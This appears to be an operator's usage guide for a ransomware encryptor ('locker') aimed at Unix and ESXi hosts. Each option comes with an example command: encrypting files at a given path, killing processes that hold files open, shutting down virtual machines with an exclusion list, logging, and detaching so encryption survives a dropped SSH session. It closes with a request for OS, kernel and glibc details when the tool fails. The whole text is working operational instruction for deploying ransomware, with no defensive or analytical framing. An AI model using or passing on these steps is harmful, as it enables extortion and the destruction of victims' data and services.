@all parameter to start the locker on unix versions
Options to run unix version
--path
     If this parameter is used, the locker will encrypt files at the specified path. This parameter is mandatory and it does not work if you don't use it.
     ./encryptor --path /path

--prockiller
     Kills all processes which prevent opening files.
     ./encryptor --path /path --prockiller

--log
     Turns on logging of all actions and errors
     ./encryptor --path /path --log /root/log.txt

-vmkiller(Only for esxi)
     Disables all virtual machines

--vmlist(esxi only)
     Sets the file with a list of virtual machines which should not be shut down. One line per virtual machine
     ./encryptor --path /path --vmkiller --vmlist /tmp/list.txt

--detach
      Detach the process from the terminal.
So if an ssh session crashed, the locker will keep working.
And files don't get corrupted.

ESXi version SHOULD BE REQUIRED AWAY.


If it doesn't work I need os, kernel version and glibc version
/lib64/libc.so.6
